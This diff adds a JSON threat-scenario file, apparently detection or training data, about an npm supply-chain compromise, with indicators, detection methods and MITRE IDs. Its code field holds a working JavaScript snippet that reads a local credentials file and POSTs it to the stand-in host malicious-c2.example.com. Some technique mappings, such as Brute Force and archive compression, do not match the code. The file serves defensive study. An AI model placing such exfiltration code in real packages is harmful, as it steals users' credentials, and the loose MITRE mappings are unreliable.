@@ -1,0 +1,49 @@
+{
+  "examples": [
+    {
+      "scenario": "Attackers compromise a popular open-source JavaScript library's npm package by injecting a malicious dependency update, leading to a supply chain compromise that distributes malware to thousands of downstream projects.",
+      "technical_data": {
+        "npm_package_version": "v3.4.1",
+        "package_json_dep_change": {
+          "original": {
+            "dependencies": {
+              "lodash": "^4.17.15"
+            }
+          },
+          "compromised": {
+            "dependencies": {
+              "lodash": "^4.17.15",
+              "event-stream": "3.3.6-malicious"
+            }
+          }
+        },
+        "package_lock_json_snippet": {
+          "event-stream": {
+            "version": "3.3.6-malicious",
+            "resolved": "https://registry.npmjs.org/event-stream/-/event-stream-3.3.6-malicious.tgz",
+            "integrity": "sha512-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+          }
+        },
+        "malicious_code_snippet": "/* event-stream 3.3.6-malicious index.js snippet */\nconst crypto = require('crypto');\nconst fs = require('fs');\n\n// malicious payload steals credentials from specific app\nmodule.exports = function () {\n  const stealData = () => {\n    const home = process.env.HOME || process.env.USERPROFILE;\n    const file = `${home}/.config/target_app/credentials.json`;\n    if (fs.existsSync(file)) {\n      const data = fs.readFileSync(file, 'utf8');\n      // encrypt and send to attacker C2\n      const cipher = crypto.createCipher('aes-256-cbc', 'secret_key');\n      let encrypted = cipher.update(data, 'utf8', 'hex');\n      encrypted += cipher.final('hex');\n      require('request').post('https://malicious-c2.example.com/collect', {form: {data: encrypted}});\n    }\n  };\n  setTimeout(stealData, 10000);\n};",
+        "network_traffic_sample": "POST /collect HTTP/1.1\r\nHost: malicious-c2.example.com\r\nUser-Agent: node-requests/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 256\r\ndata=4f5e3a9b8d7c2e1f...\r\n\r\n",
+        "audit_log_snippet": "[2024-06-10T14:23:45Z] npm install event-stream@3.3.6-malicious\n[2024-06-10T14:23:50Z] package-lock.json updated with new dependency event-stream@3.3.6-malicious\n[2024-06-10T14:24:05Z] Outbound HTTPS connection to malicious-c2.example.com from build server IP 10.1.2.3",
+        "code_signing_check_failure": "npm ERR! Invalid signature for package event-stream@3.3.6-malicious: expected signature does not match actual signature"
+      },
+      "indicators": [
+        "Unexpected new dependency 'event-stream@3.3.6-malicious' added to package.json",
+        "Network POST requests to suspicious domain malicious-c2.example.com",
+        "Package integrity check failure with mismatched code signature for event-stream package",
+        "Presence of encrypted data exfiltration code in dependency source files",
+        "Outbound TLS traffic from build environment to unknown external IPs shortly after package installation"
+      ],
+      "detection_method": "Automated dependency scanning tools detect anomalous new dependencies and versions flagged as untrusted; code signing and package integrity verification fails; network monitoring alerts on outbound POST requests to known malicious C2 domains; static code analysis flags suspicious cryptographic and network communication calls in third-party dependencies.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1059.004 - Command and Scripting Interpreter: JavaScript",
+        "T1110 - Brute Force (for credential stealing)",
+        "T1560.001 - Archive Collected Data: Archive via Compression"
+      ]
+    }
+  ]
+}
